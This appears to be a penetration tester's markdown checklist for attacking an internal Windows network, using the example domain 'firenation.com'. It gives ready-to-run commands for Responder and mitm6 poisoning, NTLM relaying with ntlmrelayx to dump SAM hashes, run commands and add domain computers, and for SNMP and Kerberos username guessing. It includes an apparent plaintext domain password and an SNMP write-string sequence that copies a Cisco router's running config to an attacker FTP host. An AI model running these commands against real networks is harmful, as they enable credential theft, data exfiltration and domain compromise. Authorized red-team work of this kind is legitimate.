# LAN Attacks & Scanning

## LAN Attacks
 - [ ] Begin running [Responder](https://github.com/SpiderLabs/Responder):
    ```
    apt update && apt install -y responder
    responder -I eth0 -wrf
    ```
 - [ ] Run [mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/):
    ```
    pip install mitm6
    mitm6 -i eth0 -d firenation.com --debug 
    ```
    *Note: Every time I've run this, it has caused network disruptions. Proceed with caution and check out params `-hw` and `-hb`*
    
 - [ ] Relay NTLM authentication from the above poisoning (this specifically is for `mitm6`)
    ```
    ## Should relay to victim via SMB. Needs local admin (I think maybe RID500...need to verify)
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh                   # Attempt to dump SAM 
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh -c "systeminfo"   # Runs "systeminfo". Caught by CrowdStrike.

    ## LDAPS NTLM relay (patches may fix this!). Any Domain User can add up to 10 computers by default. Compy can be used for BloodHound.
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -t ldaps://dc.firenation.com --add-computer
    ##
    ```
 - [ ] If you get hashes, go to [Password Cracking]() checklist
 - [ ] If you crack hashes or get access to network creds, go to [Lateral Movement & Domain PrivEsc]()

## Network Scanning
 - [ ] Kick off a big top 1024 scan. Don't forget to log it in case the scans hang up. Increase to `-T5` if you're feeling adventurous:
   ```
   mkdir scans
   nmap -iL subnets-firenation.lst -sV -sC -T4 -oA firenation-sV-sC -v | tee scans/nmap.log
   ```
 - [ ] Kick off a Nessus or other vuln scan
 - [ ] Find DNS servers if needed: `masscan -iL subnets-firenation.lst -p53 -oG dns-open`
 - [ ] Perform reverse DNS lookups on the domain: `nmap -iL subnets-firenation.lst -sL -oA dns-lookup`
 - [ ] Scan for SMB and for SMB Signing: `crackmapexec smb subnets-firenation.lst | tee scans/cme-smb-scan.log`
 - [ ] Get list of SMB open and scan for top MS vulns: `nmap -iL firenation-smb.lst -p445 --script=smb-vuln-ms08-067,smb-vuln-ms17-010 -v | tee scans/nmap-smb-vulns.log`


- ping sweep
- aquatone
    cat hosts.txt | /root/tools/1_gits/aquatone_linux_amd64_1.4.3/aquatone -out ./aquatone-results -ports 80,81,280,300,443,591,593,623,664,777,808,832,981,1010,1183,1184,1311,2082,2087,2095,2381,2480,3000,3128,3333,4035,4036,4243,4443,4567,4711,4848,4993,5000,5104,5108,5554,5800,5801,5802,5803,5988,5989,6543,6788,7000,7004,7072,7396,7443,7474,7627,8000,8001,8008,8080,8014,8042,8069,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8444,8445,8500,8765,8834,8880,8888,8983,9000,9043,9060,9090,9091,9200,9443,9800,9981,12443,1680,16992,16993,18091,20002,20720,28017
SMB version scanning & big money vulns
- Parse through open ports with: https://raw.githubusercontent.com/altjx/ipwn/master/nmap_scripts/nmapscrape.rb
- Check for Jenkins instances
- snmp checks
    wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -o snmp-strings.txt
    onesixtyone -c snmp-strings.txt -i hosts.txt -o onesixtyone-guess.txt
- SMB scans for smb signing, OS detection, big vulns
- rpcclient to get info from DC's
- KRB guessing
    pushd /opt/
    wget http://www.cqure.net/tools/krbguess-0.21-bin.tar.gz
    tar xvf krbguess-0.21-bin.tar.gz
    rm  krbguess-0.21-bin.tar.gz
    echo "alias krbguess='/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar /opt/KrbGuess/krbguess.jar'" >>  /root/.bash_aliases
    popd
    # check out: https://github.com/insidetrust/statistically-likely-usernames
    krbguess --realm firenation.com --server dc.firenation.com --dict ~/opt/jsmith.txt -o krbguess-jsmith-checkfree.txt
- rpcclient
    - Null session is `rpcclient -U '' dc.firenation.com`. MUST include the -U ''
    - Auth session is `rpcclient -U 'azula%F!r3R0cks!' dc.firenation.com`. Interesting cmds:
        - `enumdomusers` - get all the users (probably includes disabled/old accounts too)
- multirelay https://www.secureauth.com/blog/what-old-new-again-relay-attack
- kerberoasting
- asrep roasting
- Set up FTP server and FTP using a SNMP write string:
    ```
    # Install FTP server:
    # see https://www.ciscozine.com/how-to-save-configurations-using-snmp/
    sudo apt-get install pure-ftpd
    sudo adduser ftpman --home /tmp/
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1337 i 2
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.3.1337 i 4
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.4.1337 i 1
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.5.1337 a 10.41.196.142
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.6.1337 s running.config
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.7.1337 s ftpman
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.8.1337 s ftpmanPASS
    snmpwalk -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
    snmpwalk -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
    snmpset -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1337 i 2
    snmpwalk -c '*100909zJa' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
    ```
- Check for `sa:sa` and similar
- Scan for eternalblue, bluekeep (esp Win7), and similar
- Check for webmail/Exchange -- mailsniper, ruler, etc
    - https://github.com/sensepost/ruler/wiki/Homepage
    - Log in to O365 or internal and own their mailbox
- Local priv esc: 
    - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
    - https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
    - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
